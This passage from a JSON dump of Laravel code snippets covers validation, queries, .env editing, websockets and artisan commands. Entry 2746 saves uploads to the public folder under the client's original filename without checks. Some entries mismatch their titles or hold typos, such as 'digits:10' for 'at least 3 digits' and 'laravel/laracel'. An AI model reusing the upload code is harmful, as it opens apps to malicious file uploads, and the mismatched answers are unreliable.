Otherwise it will give you the matched item. firstOrNew() will give you a new model instance to work with if not match was found, but will only be saved to the database when you explicitly do so (calling save() on the model). Otherwise it will give you the matched item.\n$userData = array('username' => 'Me', 'email' => 'me@yahoo.com'); User::create($userData); \n",
    "reg_date": "2021-10-12T10:16:47.000Z"
  },
  {
    "id": 2743,
    "keyword": null,
    "link": null,
    "title": " laravel update env file programmatically",
    "description": "public static function envUpdate($key, $value)     {         $path = base_path('.env');          if (file_exists($path)) {              file_put_contents($path, str_replace(                 $key . '=' . env($key), $key . '=' . $value, file_get_contents($path)             ));         }     }  And reload the page programatically again using js only once <script>   \twindow.location.reload(); </script>\nprotected function updateDotEnv($key, $newValue, $delim='') {      $path = base_path('.env');     // get old value from current env     $oldValue = env($key);      // was there any change?     if ($oldValue === $newValue) {         return;     }      // rewrite file content with changed data     if (file_exists($path)) {         // replace current value with new value          file_put_contents(             $path, str_replace(                 $key.'='.$delim.$oldValue.$delim,                  $key.'='.$delim.$newValue.$delim,                  file_get_contents($path)             )         );     } }\n",
    "reg_date": "2021-10-12T10:16:47.000Z"
  },
  {
    "id": 2744,
    "keyword": null,
    "link": null,
    "title": " laravel update from query",
    "description": "$affected = DB::table('users')               ->where('id', 1)               ->update(['votes' => 1]);\n$update = \\DB::table('student') ->where('id', $data['id']) ->limit(1) ->update( [ 'name' => $data['name'], 'address' => $data['address'], 'email' => $data['email'], 'contactno' => $data['contactno'] ]);  \n",
    "reg_date": "2021-10-12T10:16:47.000Z"
  },
  {
    "id": 2745,
    "keyword": null,
    "link": null,
    "title": " laravel update return updated row, laravel update return",
    "description": "$user = tap($user)->update(['votes' => 123]); \nDB::table('users')             ->where('id', 1)             ->update(['votes' => 1]);\n",
    "reg_date": "2021-10-12T10:16:47.000Z"
  },
  {
    "id": 2746,
    "keyword": null,
    "link": null,
    "title": " laravel upload image to public folder",
    "description": "<?php  if($request->hasFile('image')){     $image = $request->file('image');     $image_name = $image->getClientOriginalName();     $image->move(public_path('/images'),$image_name);      $image_path = \"/images/\" . $image_name; }  ?>\n",
    "reg_date": "2021-10-12T10:16:48.000Z"
  },
  {
    "id": 2747,
    "keyword": null,
    "link": null,
    "title": " laravel uppercase first letter",
    "description": "use Illuminate\\Support\\Str;  ...  $string = Str::ucfirst('foo bar');\n",
    "reg_date": "2021-10-12T10:16:48.000Z"
  },
  {
    "id": 2748,
    "keyword": null,
    "link": null,
    "title": " laravel use config",
    "description": "env('APP_URL')\nconfig()->set('config.path', $value);\nuse Illuminate\\Support\\Facades\\Config;\n",
    "reg_date": "2021-10-12T10:16:48.000Z"
  },
  {
    "id": 2749,
    "keyword": null,
    "link": null,
    "title": " laravel use model inside blade",
    "description": "App\\Models\\ModelName::ClassName('parameter');\n",
    "reg_date": "2021-10-12T10:16:48.000Z"
  },
  {
    "id": 2750,
    "keyword": null,
    "link": null,
    "title": " laravel use references in other tables",
    "description": "use Illuminate\\Database\\Schema\\Blueprint; use Illuminate\\Support\\Facades\\Schema;  Schema::table('posts', function (Blueprint $table) {     $table->unsignedBigInteger('user_id');      $table->foreign('user_id')->references('id')->on('users'); });\n",
    "reg_date": "2021-10-12T10:16:48.000Z"
  },
  {
    "id": 2751,
    "keyword": null,
    "link": null,
    "title": " laravel use session values in view",
    "description": "$value = Session::get('variableSetOnPageA'); \n<!--This is placed in the view section --> {{ session('key_name') }}\n",
    "reg_date": "2021-10-12T10:16:48.000Z"
  },
  {
    "id": 2752,
    "keyword": null,
    "link": null,
    "title": " laravel use url",
    "description": "// Get the current URL without the query string... echo url()->current();  // Get the current URL including the query string... echo url()->full();  // Get the full URL for the previous request... echo url()->previous();\nURL::to('/');\nuse Illuminate\\Support\\Facades\\URL;  echo URL::current();\n$url = route('routeName');  //if there is a param: $url = route('routeName', ['id' => 1]);  https://laravel.com/docs/5.1/helpers#method-route \n",
    "reg_date": "2021-10-12T10:16:48.000Z"
  },
  {
    "id": 2753,
    "keyword": null,
    "link": null,
    "title": " laravel valet 504 gateway time-out",
    "description": "nano ~/usr/local/etc/nginx/nginx.conf  add inside http: client_header_timeout 3000; client_body_timeout 3000; fastcgi_read_timeout 3000; fastcgi_buffers 8 128k; fastcgi_buffer_size 128k;  valet restart\nvim /usr/local/etc/php/{version}/php.ini   max_execution_time = 300\n",
    "reg_date": "2021-10-12T10:16:48.000Z"
  },
  {
    "id": 2754,
    "keyword": null,
    "link": null,
    "title": " laravel validate date",
    "description": " $request->validate([         'start_date' => 'date_format:d/m/Y',         'end_date' => 'date_format:d/m/Y'     ]);\n'dob' => 'required|date_format:Y-m-d|after_or_equal:1920-01-01'\npublic function store(Illuminate\\Http\\Request $request) {     $this->validate($request, [         'time_start' => 'date_format:H:i',         'time_end' => 'date_format:H:i|after:time_start',     ]);      // do other stuff }\n @if ($errors->any())      @foreach ($errors->all() as $error)          <div>{{$error}}</div>      @endforeach  @endif \n 'day'            =>  'required|date',\n[   'from' =>  ['required', 'date_format:Y-m-d', 'before_or_equal:to'],   'to'  => ['required', 'date_format:Y-m-d'] ] //@sujay\n",
    "reg_date": "2021-10-12T10:16:48.000Z"
  },
  {
    "id": 2755,
    "keyword": null,
    "link": null,
    "title": " laravel validate enum field",
    "description": "$validator = Validator::make(Input::only(['username', 'password', 'type']), [     'type' => 'in:DEFAULT,SOCIAL', // DEFAULT or SOCIAL values     'username' => 'required|min:6|max:255',     'password' => 'required|min:6|max:255' ]); \n",
    "reg_date": "2021-10-12T10:16:49.000Z"
  },
  {
    "id": 2756,
    "keyword": null,
    "link": null,
    "title": " laravel validate file type",
    "description": "'image' => 'required|mimes:jpeg' //or 'image' => 'required|image'\n",
    "reg_date": "2021-10-12T10:16:49.000Z"
  },
  {
    "id": 2757,
    "keyword": null,
    "link": null,
    "title": " laravel validate integer between",
    "description": "'item' => 'required|integer|between:1,10',\n",
    "reg_date": "2021-10-12T10:16:49.000Z"
  },
  {
    "id": 2758,
    "keyword": null,
    "link": null,
    "title": " laravel validate max file size",
    "description": "$validator = Validator::make($request->all(), [     'file' => 'max:500000', ]);\n",
    "reg_date": "2021-10-12T10:16:49.000Z"
  },
  {
    "id": 2759,
    "keyword": null,
    "link": null,
    "title": " laravel validate number to be at least 3 digits",
    "description": "'txt_phone' => 'required|numeric|digits:10' \n",
    "reg_date": "2021-10-12T10:16:49.000Z"
  },
  {
    "id": 2760,
    "keyword": null,
    "link": null,
    "title": " laravel validation",
    "description": "<!-- /resources/views/post/create.blade.php -->  <h1>Create Post</h1>  @if ($errors->any())     <div class=\"alert alert-danger\">         <ul>             @foreach ($errors->all() as $error)                 <li>{{ $error }}</li>             @endforeach         </ul>     </div> @endif  <!-- Create Post Form -->\n/**  * Store a new blog post.  *  * @param  Request  $request  * @return Response  */ public function store(Request $request) {     $validatedData = $request->validate([         'title' => 'required|unique:posts|max:255',         'body' => 'required',     ]);      // The blog post is valid... }\n/**  * Bootstrap any application services.  *  * @return void  */ public function boot() {     Validator::extend(...);      Validator::replacer('foo', function ($message, $attribute, $rule, $parameters) {         return str_replace(...);     }); }\nuse Illuminate\\Validation\\Rule;  Validator::make($data, [     'email' => [         'required',         Rule::unique('users')->ignore($user->id),     ], ]);\n<?php  namespace App\\Providers;  use Illuminate\\Support\\ServiceProvider; use Illuminate\\Support\\Facades\\Validator;  class AppServiceProvider extends ServiceProvider {     /**      * Register any application services.      *      * @return void      */     public function register()     {         //     }      /**      * Bootstrap any application services.      *      * @return void      */     public function boot()     {         Validator::extend('foo', function ($attribute, $value, $parameters, $validator) {             return $value == 'foo';         });     } }\n\"foo\" => \"Your input was invalid!\",  \"accepted\" => \"The :attribute must be accepted.\",  // The rest of the validation error messages...\nRule::unique('users')->ignore($user)\nValidator::extendImplicit('foo', function ($attribute, $value, $parameters, $validator) {     return $value == 'foo'; });\nRule::unique('users')->ignore($user->id, 'user_id')\nValidator::extend('foo', 'FooValidator@validate');\n",
    "reg_date": "2021-10-12T10:16:49.000Z"
  },
  {
    "id": 2761,
    "keyword": null,
    "link": null,
    "title": " laravel validation array",
    "description": "'image' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',\n'item' => 'required|integer|between:1,10',\n'email' => 'required|email|unique:users,email', //@sujay\n$data = $request->validate([     \"name\"    => \"required|array|min:3\",     \"name.*\"  => \"required|string\", ]);\n$validator = Validator::make($request->all(), [     \"names\"    => \"required|array|min:3\",     \"names.*\"  => \"required|string|distinct|min:3\", ]); \nI found a better solution. The validate in_array expects the array to be one of the parameters in the request. The in: answer will not work if you have  commas in the array. To use the in_array without having to create a new rule  you can simply do: ( Make sure you include the .* at the end )  $this->allslots = array('10:00:00', '10:10:00', '10:20:00', '10:30:00', '10:40:00', '10:50:00', '11:00:00', '11:10:00', '11:20:00', '11:30:00', '11:40:00', '11:50:00', '12:00:00', '12:10:00', '12:20:00', '12:30:00', '12:40:00', '12:50:00', '13:00:00', '13:10:00', '13:20:00', '13:30:00', '13:40:00', '13:50:00', '14:00:00', '14:10:00', '14:20:00', '14:30:00', '14:40:00', '14:50:00', '15:00:00', '15:10:00', '15:20:00', '15:30:00', '15:40:00', '15:50:00', '16:00:00', '16:10:00', '16:20:00', '16:30:00', '16:40:00', '16:50:00');  $request['allslots'] = $this->allslots;  validate($request, [   'field' => 'required|in_array:allslots.*', ]);\n",
    "reg_date": "2021-10-12T10:16:49.000Z"
  },
  {
    "id": 2762,
    "keyword": null,
    "link": null,
    "title": " laravel validation display errors",
    "description": "@if($errors->any())     <div class=\"alert alert-danger\">         <p><strong>Opps Something went wrong</strong></p>         <ul>         @foreach ($errors->all() as $error)             <li>{{ $error }}</li>         @endforeach         </ul>     </div> @endif  @if(session('success'))     <div class=\"alert alert-success\">{{session('success')}}</div> @endif  @if(session('error'))     <div class=\"alert alert-danger\">{{session('error')}}</div> @endif \n@if($errors->has())    @foreach ($errors->all() as $error)       <div>{{ $error }}</div>   @endforeach @endif\npublic function store(Request $request) {     $validator = Validator::make($request->all(), [         'title' => 'bail|required|max:255',         'body' => 'required',     ]);      // Check validation failure     if ($validator->fails()) {        // [...]              foreach($validator->messages()->getMessages() as $field_name => $messages) {                  // Go through each message for this field.                 foreach($messages AS $message) {                     echo '***********'.$message.'***********<br>';                 }             }     }      // Check validation success     if ($validator->passes()) {        // [...]     }      // Retrieve errors message bag     $errors = $validator->errors(); }\n @if ($errors->any())      @foreach ($errors->all() as $error)          <div>{{$error}}</div>      @endforeach  @endif \n",
    "reg_date": "2021-10-12T10:16:49.000Z"
  },
  {
    "id": 2763,
    "keyword": null,
    "link": null,
    "title": " laravel validation example",
    "description": "/**  * Store a new blog post.  *  * @param  Request  $request  * @return Response  */  public function store(Request $request) {     $validatedData = $request->validate([         'title' => 'required|unique:posts|max:255',         'body' => 'required',     ]);      // The blog post is valid... }\n$rules = [         'name' => 'required',         'email' => 'required|email',         'message' => 'required|max:250',     ];      $customMessages = [         'required' => 'The :attribute field is required.'     ];      $this->validate($request, $rules, $customMessages);\n\t\t//import\t\t \t\tuse Illuminate\\Support\\Facades\\Validator; \t \t\t// single var check         $validator = Validator::make(['data' => $value],             ['data' => 'string|min:1|max:10']         );         if ($validator->fails()) {             // your code         }          // array check         $validator = Validator::make(['data' => $array],             ['email' => 'string|min:1|max:10'],             ['username' => 'string|min:1|max:10'],             ['password' => 'string|min:1|max:10'],             ['...' => '...']         );          if ($validator->fails()) {             // your code         }\n<!-- /resources/views/post/create.blade.php -->  <h1>Create Post</h1>  @if ($errors->any())     <div class=\"alert alert-danger\">         <ul>             @foreach ($errors->all() as $error)                 <li>{{ $error }}</li>             @endforeach         </ul>     </div> @endif  <!-- Create Post Form -->\n/**  * Store a new blog post.  *  * @param  Request  $request  * @return Response  */ public function store(Request $request) {     $validatedData = $request->validate([         'title' => 'required|unique:posts|max:255',         'body' => 'required',     ]);      // The blog post is valid... }\n// List of available validation rules: Accepted Active URL After (Date) After Or Equal (Date) Alpha Alpha Dash Alpha Numeric Array Bail Before (Date) Before Or Equal (Date) Between Boolean Confirmed Date Date Equals Date Format Different Digits Digits Between Dimensions (Image Files) Distinct Email Ends With Exclude If Exclude Unless Exists (Database) File Filled Greater Than Greater Than Or Equal - gte Image (File) In In Array Integer IP Address JSON Less Than Less Than Or Equal Max MIME Types MIME Type By File Extension Min Multiple Of Not In Not Regex Nullable Numeric Password Present Regular Expression Required Required If Required Unless Required With Required With All Required Without Required Without All Same Size Sometimes Starts With String Timezone Unique (Database) URL UUID\n",
    "reg_date": "2021-10-12T10:16:49.000Z"
  },
  {
    "id": 2764,
    "keyword": null,
    "link": null,
    "title": " laravel validation for mobile number",
    "description": "//inside laravel request rules(), add this for phone number varification 'phone' => 'required|min:11|numeric',\n",
    "reg_date": "2021-10-12T10:16:49.000Z"
  },
  {
    "id": 2765,
    "keyword": null,
    "link": null,
    "title": " laravel validation greater than or equal to",
    "description": "gt - greater than gte - greater than equal to lt - less than lte - less than equal to\n",
    "reg_date": "2021-10-12T10:16:50.000Z"
  },
  {
    "id": 2766,
    "keyword": null,
    "link": null,
    "title": " laravel validation image or file",
    "description": "'image' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',\n$this->validate($request, ['file' => 'image|mimes:jpeg,png,jpg,gif,svg|max:2048',]); \n$validate = Validator::make($params = $request->all(), [   'type' => 'required',   'files' => 'mimes:jpeg,png,jpg,svg,doc,docx,odt,pdf,tex,txt,wpd,tiff,tif,csv,psd,key,odp,pps,ppt,pptx,ods,xls,xlsm,xlsx' ]);\n",
    "reg_date": "2021-10-12T10:16:50.000Z"
  },
  {
    "id": 2767,
    "keyword": null,
    "link": null,
    "title": " laravel validation integer",
    "description": "'count' => 'integer'\n$rules = ['Fno' => 'numeric|min:2|max:5', 'Lno' => 'numeric|min:2']; \n'item' => 'required|integer|between:1,10',\n/**  * Store a new blog post.  *  * @param  Request  $request  * @return Response  */  public function store(Request $request) {     $validatedData = $request->validate([         'title' => 'required|unique:posts|max:255',         'body' => 'required',     ]);      // The blog post is valid... }\n$rules = [         'name' => 'required',         'email' => 'required|email',         'message' => 'required|max:250',     ];      $customMessages = [         'required' => 'The :attribute field is required.'     ];      $this->validate($request, $rules, $customMessages);\n# <values> = foo,bar,... # <field> = array field # <characters> = amount of characters  # accepted\t\t\t\t\t           # active_url # after:<tomorrow>\t\t\t           # after_or_equal:<tomorrow> # alpha\t\t\t\t\t\t           # alpha_dash # alpha_num\t\t\t\t\t           # array # bail \t\t\t\t\t               # before:<today> # before_or_equal:<today>              # between:min,max # boolean\t\t\t\t\t           # confirmed # date\t\t\t\t\t\t           # date_equals:<today> # date_format:<format> \t\t           # different:<name> # digits:<value>\t\t\t           # digits_between:min,max # dimensions:<min/max_with>\t           # distinct # email\t\t\t\t\t\t           # ends_with:<values> # exclude_if:<field>,<value>           # exclude_unless:<field>,<value> # exists:<table>,<column>\t           # file # filled\t\t\t\t\t           # gt:<field> # gte:<field>\t\t\t\t           # image # in:<values>\t\t\t\t           # in_array:<field> # integer\t\t\t\t\t           # ip # ipv4                                 # ipv6   # json\t\t\t\t\t\t           # lt:<field> # lte:<field>       \t\t           # max:<value> # mimetypes:video/avi,...\t           # mimes:jpeg,bmp,png # min:<value>\t\t\t\t           # not_in:<values> # not_regex:<pattern> \t\t           # nullable # numeric\t\t\t\t\t           # password:<auth guard> # present\t\t\t\t\t           # regex:<pattern> # required\t\t\t\t\t           # required_if:<field>,<value> # required_unless:<field>,<value>      # required_with:<fields> # required_with_all:<fields>\t       # required_without:<fields> # required_without_all:<fields>        # same:<field> # size:<characters>\t\t\t           # starts_with:<values> # string\t\t\t\t\t\t       # timezone # unique:<table>,<column>\t\t       # url # uuid\n",
    "reg_date": "2021-10-12T10:16:50.000Z"
  },
  {
    "id": 2768,
    "keyword": null,
    "link": null,
    "title": " laravel validation number greater than 0",
    "description": "//amount must be greater than 0 laravel validation  function store(Request $request) {   $request->validate([      'product_price' => 'required|numeric|gt:0'    ]);  }  //@sujay\n",
    "reg_date": "2021-10-12T10:16:50.000Z"
  },
  {
    "id": 2769,
    "keyword": null,
    "link": null,
    "title": " laravel validation numeric vs integer",
    "description": "Integer is like a whole number without fraction: 2, 256, 2048    Numeric is any number including floating point numbers: 2.478, +0123.45e6\n",
    "reg_date": "2021-10-12T10:16:50.000Z"
  },
  {
    "id": 2770,
    "keyword": null,
    "link": null,
    "title": " laravel validation pdf",
    "description": "$rules  = [     \"file\" => \"required|mimes:pdf|max:10000\" ] \n",
    "reg_date": "2021-10-12T10:16:50.000Z"
  },
  {
    "id": 2771,
    "keyword": null,
    "link": null,
    "title": " laravel validation rules for video upload",
    "description": "'video' => 'mimetypes:video/x-ms-asf,video/x-flv,video/mp4,application/x-mpegURL,video/MP2T,video/3gpp,video/quicktime,video/x-msvideo,video/x-ms-wmv,video/avi' \n",
    "reg_date": "2021-10-12T10:16:50.000Z"
  },
  {
    "id": 2772,
    "keyword": null,
    "link": null,
    "title": " laravel validation show",
    "description": "@if($errors->any())     <div class=\"alert alert-danger\">         <p><strong>Opps Something went wrong</strong></p>         <ul>         @foreach ($errors->all() as $error)             <li>{{ $error }}</li>         @endforeach         </ul>     </div> @endif  @if(session('success'))     <div class=\"alert alert-success\">{{session('success')}}</div> @endif  @if(session('error'))     <div class=\"alert alert-danger\">{{session('error')}}</div> @endif \n<!-- /resources/views/post/create.blade.php -->  <h1>Create Post</h1>  @if ($errors->any())     <div class=\"alert alert-danger\">         <ul>             @foreach ($errors->all() as $error)                 <li>{{ $error }}</li>             @endforeach         </ul>     </div> @endif  <!-- Create Post Form -->\n",
    "reg_date": "2021-10-12T10:16:50.000Z"
  },
  {
    "id": 2773,
    "keyword": null,
    "link": null,
    "title": " laravel validation time hours minutes format",
    "description": " $request->validate([         'start_date' => 'date_format:d/m/Y',         'end_date' => 'date_format:d/m/Y'     ]);\npublic function store(Illuminate\\Http\\Request $request) {     $this->validate($request, [         'time_start' => 'date_format:H:i',         'time_end' => 'date_format:H:i|after:time_start',     ]);      // do other stuff } \n[   'from' =>  ['required', 'date_format:Y-m-d', 'before_or_equal:to'],   'to'  => ['required', 'date_format:Y-m-d'] ] //@sujay\n",
    "reg_date": "2021-10-12T10:16:50.000Z"
  },
  {
    "id": 2774,
    "keyword": null,
    "link": null,
    "title": " laravel validation types for float",
    "description": "//For float, must use numeric validator  /**   * Get the validation rules that apply to the request.   *   * @return array  */ public function rules() {   return [     'field' => 'numeric'   ]; }\n",
    "reg_date": "2021-10-12T10:16:50.000Z"
  },
  {
    "id": 2775,
    "keyword": null,
    "link": null,
    "title": " laravel validation unique email",
    "description": "'email' => 'unique:users,email_address,'.$user->id \n'email' => 'required|email|unique:users,email', //@sujay\n/**  * Store a new blog post.  *  * @param  Request  $request  * @return Response  */  public function store(Request $request) {     $validatedData = $request->validate([         'title' => 'required|unique:posts|max:255',         'body' => 'required',     ]);      // The blog post is valid... }\nunique:table,column,except,idColumn  ############## Example : ################  ############### For Updating   //rules 'email' => 'unique:users,email_address,' . $userId,  ############### For Creating  //rules 'email' => 'unique:users,email_address',\n'user.email' => 'required|email|unique:users,email,'.$user->id, //@sujay\n",
    "reg_date": "2021-10-12T10:16:51.000Z"
  },
  {
    "id": 2776,
    "keyword": null,
    "link": null,
    "title": " laravel validation unique if this field is changed",
    "description": "use Illuminate\\Validation\\Rule;  $request->validate([     'phone' => [         'required',         Rule::unique('table_name', 'column_name')->ignore($request->id),     ], ]);\n",
    "reg_date": "2021-10-12T10:16:51.000Z"
  },
  {
    "id": 2777,
    "keyword": null,
    "link": null,
    "title": " laravel validator make custom message",
    "description": "$rules = [         'name' => 'required',         'email' => 'required|email',         'message' => 'required|max:250',     ];      $customMessages = [         'required' => 'The :attribute field is required.'     ];      $this->validate($request, $rules, $customMessages);\n$rules = [         'name' => 'required',         'email' => 'required|email',         'message' => 'required|max:250',     ];      $customMessages = [         'required' => 'The :attribute field is required.'     ];      $this->validate($request, $rules, $customMessages); \n$rules = [         'name' => 'required',         'email' => 'required|email',         'message' => 'required|max:250',     ];      $customMessages = [         'required' => 'The :attribute field is required.'     ];      $this->validate($request, $rules, $customMessages); //@sujay\n$messages = [         'exists' => 'Your custom message',     ];     $this->validate($request, [     'recovery_code' => 'required|exists:users,email_recovery_code',     'new_password'=>'required',     'confirm_password'=>'required|same:new_password',     ],$messages);\n",
    "reg_date": "2021-10-12T10:16:51.000Z"
  },
  {
    "id": 2778,
    "keyword": null,
    "link": null,
    "title": " laravel vendor:publish not working",
    "description": "php artisan vendor:publish --provider=\"Roumen\\Feed\\FeedServiceProvider\" \n",
    "reg_date": "2021-10-12T10:16:51.000Z"
  },
  {
    "id": 2779,
    "keyword": null,
    "link": null,
    "title": " laravel vendor publish all files",
    "description": "php artisan vendor:publish --all\n",
    "reg_date": "2021-10-12T10:16:51.000Z"
  },
  {
    "id": 2780,
    "keyword": null,
    "link": null,
    "title": " laravel version check",
    "description": "php artisan --version\nphp artisan --version   or php artisan -v\nphp artisan --version  //enter in terminal\nphp ./artisan --version ##or php artisan --version\n",
    "reg_date": "2021-10-12T10:16:51.000Z"
  },
  {
    "id": 2781,
    "keyword": null,
    "link": null,
    "title": " laravel version command",
    "description": "php artisan --version\n",
    "reg_date": "2021-10-12T10:16:51.000Z"
  },
  {
    "id": 2782,
    "keyword": null,
    "link": null,
    "title": " laravel view with data in blade",
    "description": "// Here `test-file.blade.php` is the view file and  // We are passong `is_footer_messages` = true  @include('test-file', [ 'is_footer_messages' => true ])     // Access this vairable now in `test-file.blade.php` {{ $is_footer_messages }} \nuse TCG\\Voyager\\Models\\Jobtype;  class FormController extends Controller { public function index() {    $category = Jobtype::all();    return view('contact', compact('category'));  } } \n",
    "reg_date": "2021-10-12T10:16:51.000Z"
  },
  {
    "id": 2783,
    "keyword": null,
    "link": null,
    "title": " laravel vue",
    "description": "$ php artisan ui vue --auth \n***** First install laravel UI. Run below given command first in terminal or cmd or powershell *** composer require laravel/ui:^2.4  ## Then Run this command   php artisan ui vue  \ncomposer create-project --prefer-dist laravel/laracel blog\n",
    "reg_date": "2021-10-12T10:16:52.000Z"
  },
  {
    "id": 2784,
    "keyword": null,
    "link": null,
    "title": " laravel vue csrf",
    "description": "data() {         return {             csrf: document.querySelector('meta[name=\"csrf-token\"]').getAttribute('content')         } }\n",
    "reg_date": "2021-10-12T10:16:52.000Z"
  },
  {
    "id": 2785,
    "keyword": null,
    "link": null,
    "title": " laravel web.php auth Undefined type 'Auth'.",
    "description": "use Illuminate\\Support\\Facades\\Auth;\n",
    "reg_date": "2021-10-12T10:16:52.000Z"
  },
  {
    "id": 2786,
    "keyword": null,
    "link": null,
    "title": " laravel websockets onclose",
    "description": "// Add websocket routes \"App\\Providers\\RouteServiceProvider.php\" public function map() {     $this->mapApiRoutes();      $this->mapWebRoutes();        $this->app->singleton('websockets.router', function () {         return new Router();     }); }  // Create WebSocket Router \"App\\WebSockets\\Route.php\" class Router extends \\BeyondCode\\LaravelWebSockets\\Server\\Router {     public function echo()     {         $this->get('/app/{appKey}', WebSocketHandler::class);         $this->post('/apps/{appId}/events', TriggerEventController::class);         $this->get('/apps/{appId}/channels', FetchChannelsController::class);         $this->get('/apps/{appId}/channels/{channelName}', FetchChannelController::class);         $this->get('/apps/{appId}/channels/{channelName}/users', FetchUsersController::class);     } }  // Create WebSocket Router \"App\\WebSockets\\WebSocketHandler.php\" class WebSocketHandler extends \\BeyondCode\\LaravelWebSockets\\WebSockets\\WebSocketHandler {     public function onClose(ConnectionInterface $connection, MessageInterface $message)     {         parent::onClose($connection, $message);       \t// Your code here...     } }\n",
    "reg_date": "2021-10-12T10:16:52.000Z"
  },
  {
    "id": 2787,
    "keyword": null,
    "link": null,
    "title": " laravel websockets onmessage",
    "description": "// Add websocket routes \"App\\Providers\\RouteServiceProvider.php\" public function map() {     $this->mapApiRoutes();      $this->mapWebRoutes();        $this->app->singleton('websockets.router', function () {         return new Router();     }); }  // Create WebSocket Router \"App\\WebSockets\\Route.php\" class Router extends \\BeyondCode\\LaravelWebSockets\\Server\\Router {     public function echo()     {         $this->get('/app/{appKey}', WebSocketHandler::class);         $this->post('/apps/{appId}/events', TriggerEventController::class);         $this->get('/apps/{appId}/channels', FetchChannelsController::class);         $this->get('/apps/{appId}/channels/{channelName}', FetchChannelController::class);         $this->get('/apps/{appId}/channels/{channelName}/users', FetchUsersController::class);     } }  // Create WebSocket Router \"App\\WebSockets\\WebSocketHandler.php\" class WebSocketHandler extends \\BeyondCode\\LaravelWebSockets\\WebSockets\\WebSocketHandler {     public function onMessage(ConnectionInterface $connection, MessageInterface $message)     {         parent::onMessage($connection, $message);       \t// Your code here...     } }\n",
    "reg_date": "2021-10-12T10:16:52.000Z"
  },
  {
    "id": 2788,
    "keyword": null,
    "link": null,
    "title": " laravel websockets onsubscribe",
    "description": "// Add websocket routes \"App\\Providers\\RouteServiceProvider.php\" public function map() {     $this->mapApiRoutes();      $this->mapWebRoutes();        $this->app->singleton('websockets.router', function () {         return new Router();     }); }  // Create WebSocket Router \"App\\WebSockets\\Route.php\" class Router extends \\BeyondCode\\LaravelWebSockets\\Server\\Router {     public function echo()     {         $this->get('/app/{appKey}', WebSocketHandler::class);         $this->post('/apps/{appId}/events', TriggerEventController::class);         $this->get('/apps/{appId}/channels', FetchChannelsController::class);         $this->get('/apps/{appId}/channels/{channelName}', FetchChannelController::class);         $this->get('/apps/{appId}/channels/{channelName}/users', FetchUsersController::class);     } }  // Create WebSocket Router \"App\\WebSockets\\WebSocketHandler.php\" class WebSocketHandler extends \\BeyondCode\\LaravelWebSockets\\WebSockets\\WebSocketHandler {     public function onMessage(ConnectionInterface $connection, MessageInterface $message)     {         parent::onMessage($connection, $message);         $message = json_decode($message->getPayload(), true);         if ($message['event'] === 'pusher:subscribe') {        \t\t// Your code here...         }     } }\n",
    "reg_date": "2021-10-12T10:16:52.000Z"
  },
  {
    "id": 2789,
    "keyword": null,
    "link": null,
    "title": " laravel when",
    "description": "Inner Join \t: ->join('contacts', 'users.id', '=', 'contacts.user_id') Left Join \t: ->leftJoin('posts', 'users.id', '=', 'posts.user_id') Right Join \t: ->rightJoin('posts', 'users.id', '=', 'posts.user_id') Cross Join \t: ->crossJoin('colors')  Advance Queries :  -----------------   \t\t->join('contacts', function ($join) {             $join->on('users.id', '=', 'contacts.user_id')                  ->where('contacts.user_id', '>', 5);         })   \nDB::table('users')->insert([     'email' => 'kayla@example.com',     'votes' => 0 ]);\n/* you may only want to apply a where statement if a given input value is present on the incoming request. */ $role = $request->input('role');  $users = DB::table('users')                 ->when($role, function ($query, $role) {                     return $query->where('role_id', $role);                 })                 ->get();\n$affected = DB::table('users')               ->where('id', 1)               ->update(['votes' => 1]);\nDB::table(..)->select(..)->whereNotIn('book_price', [100,200])->get();\n $customer = DB::table('customers')                 ->join('shops', 'customers.shop_id', '=', 'shops.shop_id')                 ->where('customer_contact', $contact_no)                 ->get();\n",
    "reg_date": "2021-10-12T10:16:52.000Z"
  },
  {
    "id": 2790,
    "keyword": null,
    "link": null,
    "title": " laravel wher in",
    "description": "$users = DB::table('users')                     ->whereIn('id', [1, 2, 3])                     ->get();\n",
    "reg_date": "2021-10-12T10:16:52.000Z"
  },
  {
    "id": 2791,
    "keyword": null,
    "link": null,
    "title": " laravel whereIn example",
    "description": " DB::table('user')->whereIn('id', [100,200])->get();\npublic function index() {     $data= User::whereIn('name', ['john','dam','smith'])->get();         dd($data);                     } \n",
    "reg_date": "2021-10-12T10:16:53.000Z"
  },
  {
    "id": 2792,
    "keyword": null,
    "link": null,
    "title": " laravel whereRaw",
    "description": "use Illuminate\\Support\\Facades\\DB;  $users = DB::table('users')             ->join('contacts', 'users.id', '=', 'contacts.user_id')             ->join('orders', 'users.id', '=', 'orders.user_id')             ->select('users.*', 'contacts.phone', 'orders.price')             ->get();\nDB::table(..)->select(..)->whereNotIn('book_price', [100,200])->get();\n$users = DB::table('users')                 ->where('name', 'like', 'T%')                 ->get();\n$users = DB::table('users')                     ->whereIn('id', [1, 2, 3])                     ->get();\nuse Illuminate\\Support\\Facades\\DB;  $first = DB::table('users')             ->whereNull('first_name');  $users = DB::table('users')             ->whereNull('last_name')             ->union($first)             ->get();\n",
    "reg_date": "2021-10-12T10:16:53.000Z"
  },
  {
    "id": 2793,
    "keyword": null,
    "link": null,
    "title": " laravel where between cluse",
    "description": "$query->whereBetween('age', [$ageFrom, $ageTo]);\n",
    "reg_date": "2021-10-12T10:16:53.000Z"
  },
  {
    "id": 2794,
    "keyword": null,
    "link": null,
    "title": " laravel where closure",
    "description": "DB::table(..)->select(..)->whereNotIn('book_price', [100,200])->get();\n$externalValue = \"User\"; $users = User::where(function ($query) use($externalValue) {             return $query->where('type','Admin')->orWhere('type',$externalValue);         })->where(\"role\",1)->get();\nDB::table('users')->where('name', Input::get('name'))->get(); \n",
    "reg_date": "2021-10-12T10:16:53.000Z"
  },
  {
    "id": 2795,
    "keyword": null,
    "link": null,
    "title": " laravel where condition on relationship",
    "description": "App\\Request::where('id',4)     ->whereHas('quotes', function ($query) {         $query->where('status','=','3');     })     ->with('quotes','sourceTable','destinationTable')     ->get();  \nclass Game extends Eloquent {     // many more stuff here      // relation without any constraints ...works fine      public function videos() {         return $this->hasMany('Video');     }      // results in a \"problem\", se examples below     public function available_videos() {         return $this->videos()->where('available','=', 1)->get();     } }\n",
    "reg_date": "2021-10-12T10:16:53.000Z"
  },
  {
    "id": 2796,
    "keyword": null,
    "link": null,
    "title": " laravel where created at today",
    "description": "$posts = Post::whereDate('created_at', Carbon::today())->get();\n$q->whereDay('created_at', '=', date('d')); $q->whereMonth('created_at', '=', date('m')); $q->whereYear('created_at', '=', date('Y'));\n$q->where('created_at', '>=', date('Y-m-d').' 00:00:00'));\n",
